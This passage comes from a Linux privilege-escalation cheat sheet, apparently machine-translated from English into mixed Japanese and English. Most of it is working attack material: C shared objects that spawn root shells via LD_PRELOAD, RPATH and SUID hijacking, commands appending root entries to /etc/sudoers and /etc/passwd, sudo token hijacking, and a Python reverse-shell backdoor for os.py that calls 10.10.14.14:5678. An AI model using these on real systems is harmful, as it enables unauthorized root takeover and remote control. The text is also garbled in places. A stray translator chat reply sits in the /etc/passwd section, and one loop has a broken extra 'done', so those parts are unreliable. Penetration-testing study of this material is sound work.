このディレクティブは、コマンド実行時に**環境変数を設定する**ことを可能にします:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例（**based on HTB machine Admirer**）は、スクリプトをrootとして実行している間に任意のpython libraryをロードするための**PYTHONPATH hijacking**に**脆弱性がありました**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 実行時のパスをバイパス

**Jump** して他のファイルを読んだり、**symlinks** を使ったりします。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\_*
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし **wildcard** が使われている (\*) なら、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID バイナリでコマンドパスが指定されていない場合

もし **sudo permission** が単一のコマンドに対して **パスを指定せずに** 与えられている場合: _hacker10 ALL= (root) less_、PATH 変数を変更することで悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
このテクニックは、**suid** バイナリが**パスを指定せずに別のコマンドを実行する場合（常に _**strings**_ で奇妙な SUID バイナリの内容を確認してください）**にも使用できます。

[Payload examples to execute.](payloads-to-execute.md)

### SUID バイナリとコマンドのパス

もし**suid**バイナリが**パスを指定して別のコマンドを実行する**なら、suidファイルが呼び出すコマンド名で**export a function**を試すことができます。

例えば、もしsuidバイナリが _**/usr/sbin/service apache2 start**_ を呼んでいる場合、関数を作成してexportしてみる必要があります:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
次の名前で保存: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、以下を使用して**コンパイルします**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行して
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 同様の privesc は、攻撃者が **LD_LIBRARY_PATH** 環境変数を制御している場合に悪用される可能性があります。攻撃者はライブラリが検索されるパスを制御できるためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

通常とは異なる**SUID**パーミッションを持つバイナリに遭遇した場合、そのバイナリが**.so**ファイルを正しく読み込んでいるかを確認するのが良い習慣です。次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、悪用の可能性が示唆されます。

これを悪用するには、_"/path/to/.config/libcalc.c"_ という C ファイルを作成し、次のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイル権限を操作して特権付きでシェルを実行することで権限を昇格させることを目的としています。

上記のCファイルを共有オブジェクト（.so）ファイルにコンパイルするには:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID binary を実行すると exploit がトリガーされ、system compromise の可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
SUID バイナリが書き込み可能なフォルダからライブラリを読み込んでいることが分かったので、そのフォルダに必要な名前のライブラリを作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが出た場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
これは、生成したライブラリに `a_function_name` という名前の関数が含まれている必要があることを意味します。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、ローカルのセキュリティ制限を回避するために攻撃者が悪用できる Unix バイナリのキュレートされたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに引数を**注入**することしかできないケース向けの同様のリソースです。

このプロジェクトは、restricted shells を破る、特権を昇格または維持する、ファイルを転送する、bind and reverse shells を生成する、その他の post-exploitation タスクを容易にするために悪用できる Unix バイナリの正当な機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して、sudo ルールを悪用できる方法が見つかるかどうかを確認できます。

### Reusing Sudo Tokens

パスワードはわからないが **sudo access** がある場合、**sudo コマンドの実行を待ち、そのセッショントークンをハイジャックする**ことで権限を昇格できます。

権限を昇格するための要件:

- すでに _sampleuser_ ユーザとしてシェルを持っている
- _sampleuser_ は直近 **15分以内** に何かを実行するために **`sudo` を使用している**（デフォルトではこれが、パスワード入力なしで `sudo` を使える sudo トークンの有効期間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 であること
- `gdb` が利用可能であること（アップロードできる必要があります）

(一時的に `ptrace_scope` を有効化するには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、`/etc/sysctl.d/10-ptrace.conf` を恒久的に変更して `kernel.yama.ptrace_scope = 0` を設定します)

これらすべての要件が満たされていれば、**次を使って権限を昇格できます:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 最初の **exploit** (`exploit.sh`) はバイナリ `activate_sudo_token` を _/tmp_ に作成します。これを使って **自分のセッションで sudo トークンを有効化** できます（自動的に root シェルが得られるわけではありません。`sudo su` を実行してください）:
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ に root 所有で setuid な sh シェルを作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- この **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成し**、**sudo tokens を永続化し、すべてのユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

もしフォルダまたはその中に作成されたファイルのいずれかに対して**write permissions**がある場合、バイナリ[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)を使って**create a sudo token for a user and PID**することができます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、かつその user として PID 1234 の shell を持っている場合、パスワードを知らなくても次のようにして**obtain sudo privileges**できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使えるか、どのように使えるかを設定します。これらのファイルは **デフォルトでは user root および group root によってのみ読み取り可能です**.\\
**もし**このファイルを**読む**ことができれば、**興味深い情報を入手できる**可能性があり、また任意のファイルに**書き込み**できれば、**権限昇格**が可能になります。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みができれば、その権限を悪用できます
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` バイナリの代替として OpenBSD 向けの `doas` などがあります。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

If you know that a **ユーザが通常マシンに接続して `sudo` を使う** to escalate privileges and you got a shell within that user context, you can **新しい sudo executable を作成する** that will execute your code as root and then the user's command. Then, **modify the $PATH** of the user context (for example adding the new path in .bash_profile) so when the user executes sudo, your sudo executable is executed.

Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Or running something like:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は **どこから設定ファイルが読み込まれるか** を示します。通常、このファイルには次の記述が含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり `/etc/ld.so.conf.d/*.conf` にある設定ファイルが読み込まれます。これらの設定ファイルは **ライブラリが検索される他のフォルダを指します**。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**システムは `/usr/local/lib` 内をライブラリ検索します**。

何らかの理由で、指定されたいずれかのパス（`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` に記載されている設定ファイル内の任意のフォルダ）に **ユーザーが書き込み権限を持っている** 場合、特権昇格が可能になるかもしれません。\
以下のページで **この誤設定をどのように悪用するか** を確認してください:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されている通り、プログラムはこの場所の lib を使用します。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`/var/tmp` に悪意のあるライブラリを `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` で作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **プロセスに対して利用可能な root 権限の部分集合**。これは実質的に root の**権限をより小さく識別可能な単位に分割**します。これらの各単位は個別にプロセスへ付与できるようになります。こうして権限の全体集合が削減され、悪用のリスクが低減します。\
次のページを読んで、**capabilities とそれらの悪用方法について詳しく学んでください**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**bit for "execute"** は対象ユーザが **"cd"** でフォルダに入れることを意味します。\
**"read"** ビットはユーザが **list** で **files** を確認できることを意味し、**"write"** ビットはユーザが **delete** および **create** で新しい **files** を作成・削除できることを意味します。

## ACLs

Access Control Lists (ACLs) は裁量的権限の二次的レイヤーを表し、**traditional ugo/rwx permissions を上書きする**ことができます。これらの権限は、所有者やグループの一員でない特定のユーザに対して権利を許可または拒否することで、ファイルやディレクトリへのアクセス制御を強化します。このレベルの**粒度により、より正確なアクセス管理が可能になります**。詳しくは[**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)を参照してください。

**ユーザ "kali" にファイルの read と write 権限を付与する:**
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得** システムから特定の ACL を持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 開かれた shell sessions

**古いバージョン**では、別のユーザー（**root**）の**shell**セッションを**hijack**できる場合があります。\
**最新のバージョン**では、**自分のユーザー**の screen sessions にのみ **connect** できるようになりました。しかし、session 内に **興味深い情報** が見つかることがあります。

### screen sessions hijacking

**screen sessions を一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは**古い tmux バージョン**の問題でした。非特権ユーザーとして root によって作成された tmux (v2.1) セッションを hijack できませんでした。

**tmux セッションを一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチ**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
例として **Valentine box from HTB** を確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebian系システム（Ubuntu、Kubuntuなど）で生成されたすべての SSL および SSH キーは、この脆弱性の影響を受ける可能性があります。\
このバグはこれらのOSで新しい ssh キーを作成したときに発生します。**可能なバリエーションはわずか 32,768 しかありませんでした**。つまり、全ての可能性を計算でき、**ssh の公開鍵を持っていれば対応する秘密鍵を検索できます**。計算された候補はここで見つかります: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH の興味深い設定値

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合に、サーバーが空のパスワード文字列のアカウントへのログインを許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が ssh を使ってログインできるかどうかを指定します。デフォルトは `no` です。可能な値:

- `yes`: root はパスワードおよび秘密鍵でログインできます
- `without-password` または `prohibit-password`: root は秘密鍵のみでログインできます
- `forced-commands-only`: root は秘密鍵でのみログインでき、かつ command オプションが指定されている場合に限ります
- `no` : 許可しない

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h` のようなトークンを含めることができ、これはホームディレクトリに置き換えられます。**絶対パスを指定できます**（`/` で始まる）または**ユーザーのホームからの相対パス**を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「**testusername**」の**private**キーで login を試みると、ssh があなたのキーの public key を `/home/testusername/.ssh/authorized_keys` および `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding は、サーバー上に（パスフレーズ無しで）鍵を残しておく代わりに、**use your local SSH keys instead of leaving keys** ことを可能にします。つまり、ssh であるホストへ **jump** し、そこから最初のホストにある **key** を **using** して別のホストへ **jump to another** ことができます。

このオプションは `$HOME/.ssh.config` に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
不審なプロファイルスクリプトが見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow ファイル

使用している OS によっては `/etc/passwd` や `/etc/shadow` が別名だったり、バックアップが存在することがあります。そのため、**すべてを見つけ出し**、それらが**読めるか確認して**、ファイル内に**ハッシュが含まれているか**を確認することが推奨されます:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等の）ファイル内に**password hashes**が見つかることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のいずれかのコマンドで password を生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
README.md の該当内容をこちらに貼ってください。  
その内容を日本語に翻訳し、指定どおり Markdown/HTML タグやパスを保持したまま翻訳します。  

また、「user `hacker` を追加し、生成したパスワードを追加する」について確認です：README に生成パスワードを平文で記載してよいですか？（セキュリティ上の注意：平文パスワードの公開は推奨されません。）
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドで `hacker:hacker` を使うことができます

あるいは、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` にあり、`/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

いくつかの機密ファイルに**書き込み**できるか確認してください。例えば、いくつかの**サービス設定ファイル**に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが**tomcat**サーバーを実行していて、**/etc/systemd/内のTomcatサービス設定ファイルを修正できる**場合、次の行を修正できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor は次回 tomcat を起動したときに実行されます。

### フォルダの確認

以下のフォルダにはバックアップや興味深い情報が含まれている可能性があります： **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のものは読めないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/所有ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内の Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでください。これは、**パスワードを含んでいる可能性のあるいくつかのファイル**を検索します。\
この目的で使用できる**別の興味深いツール**は: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、Windows、Linux & Mac のローカルコンピュータに保存されている多数のパスワードを取得するためのオープンソースのアプリケーションです。

### ログ

ログを読むことができれば、**interesting/confidential information inside them** を見つけられるかもしれません。ログがより奇妙であればあるほど、（おそらく）より興味深いでしょう。\
また、設定が "**bad**"（backdoored?）な **audit logs** の中には、この投稿で説明されているように監査ログ内に **record passwords** を記録できるものがあります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読むためのグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) は非常に役立ちます。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイルの**name**や**content**に**password**という単語が含まれているファイル、またログ内のIPsやemails、あるいはhashes regexpsも確認してください。\
ここではこれらすべてを行う方法を列挙しませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が行う最新のチェックをご確認ください。

## 書き込み可能なファイル

### Python library hijacking

もし、**どこから** python スクリプトが実行されるか分かっていて、そのフォルダに**書き込みできる**か、あるいは**python ライブラリを変更できる**なら、OS ライブラリを改変してバックドアを仕込むことができます（python スクリプトが実行される場所に書き込める場合は、os.py ライブラリをコピー＆ペーストしてください）。

ライブラリに**backdoor the library**するには、os.py ライブラリの末尾に以下の行を追加してください (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` の脆弱性により、ログファイルまたはその親ディレクトリに対して **書き込み権限** を持つユーザーが特権昇格を引き起こす可能性があります。これは、`logrotate` が多くの場合 **root** として動作しており、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行するよう操作できるためです。権限は _/var/log_ だけでなく、ログローテーションが適用されるすべてのディレクトリで確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` およびそれ以前に影響します

脆弱性の詳細は次のページで確認できます: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** に非常によく似ています。したがって、ログを改変できることが判明した場合は、そのログを誰が管理しているかを確認し、ログをシンボリックリンクに置き換えて特権昇格できないか確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性の参照:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由でユーザーが _/etc/sysconfig/network-scripts_ に `ifcf-<whatever>` スクリプトを **書き込める** または既存のものを **編集できる** 場合、あなたのシステムは **pwned** です。

Network scripts（例：_ifcg-eth0_）はネットワーク接続に使用されます。見た目は .INI ファイルとまったく同じです。しかし、これらは Linux 上で Network Manager (dispatcher.d) によって \~sourced\~ されます。

私の場合、これらの network scripts における `NAME=` の扱いが正しくありません。名前に **スペース/空白が含まれていると、システムは空白以降の部分を実行しようとします**。つまり **最初の空白以降のすべてが root として実行されます**。

例えば： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間の空白に注意_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

一方で `/etc/init` は **Upstart** に関連付けられており、Ubuntu が導入したより新しい **service management** で、サービス管理用の設定ファイルを使用します。Upstart への移行後も、Upstart の互換レイヤにより SysVinit スクリプトは Upstart の設定と並行して利用され続けます。

**systemd** はモダンな初期化およびサービスマネージャとして登場し、オンデマンドのデーモン起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供します。配布パッケージ用のファイルは `/usr/lib/systemd/`、管理者による変更用は `/etc/systemd/system/` に整理され、システム管理作業を効率化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

